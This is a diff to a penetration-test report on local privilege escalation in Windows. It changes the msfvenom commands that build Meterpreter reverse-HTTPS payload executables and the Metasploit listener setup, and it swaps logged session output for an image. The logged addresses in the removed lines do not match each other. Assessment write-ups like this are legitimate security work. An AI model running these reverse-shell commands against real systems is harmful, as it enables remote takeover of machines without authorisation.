@@ -40,6 +40,8 @@ End Sub
 ```
 
 
+
+
 ## 1. Executive Summary
 
 The assessment identified a critical misconfiguration in the local security policy that allowed for local privilege escalation from standard user to SYSTEM. Additionally, unencrypted data staging practices were observed. These findings indicate a need for stricter application control policies and encryption requirements for temporary files.
@@ -53,22 +55,21 @@ The assessment identified a critical misconfiguration in the local security poli
 **Commands Used:**
 ```bash
 # Payload Generation
-msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.92.136 LPORT=50500 -f exe -o RATa.exe
-msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.92.136 LPORT=50500 -f exe -o RATb.exe
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.92.136 LPORT=14000 -f exe -o RATa.exe
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.92.136 LPORT=14000 -f exe -o RATb.exe
 
 # Listener Setup
 use exploit/multi/handler
 set payload windows/x64/meterpreter/reverse_https
 set LHOST 192.168.92.136
-set LPORT 50500
-run
+set LPORT 14000
+exploit -j
 ```
 
 **Session Output Analysis:**
 Upon execution, the following session was established:
-`[*] Started reverse TCP handler on 192.168.92.136:50500`
-`[-] Handler failed to receive a payload (timed out)` *(Note: Initial attempt failed due to firewall)*
-`[*] Meterpreter session 1 opened (192.168.50.10:443 -> 192.168.50.25:49822)`
+
+<img width="1264" height="395" alt="image" src="https://github.com/user-attachments/assets/f2e08fbc-c4a8-41d7-b8e2-f03bb09fc1bd" />
 
 *   **ID:** Unique identifier for the session.
 *   **Type:** `meterpreter` indicates full-featured agent connection.
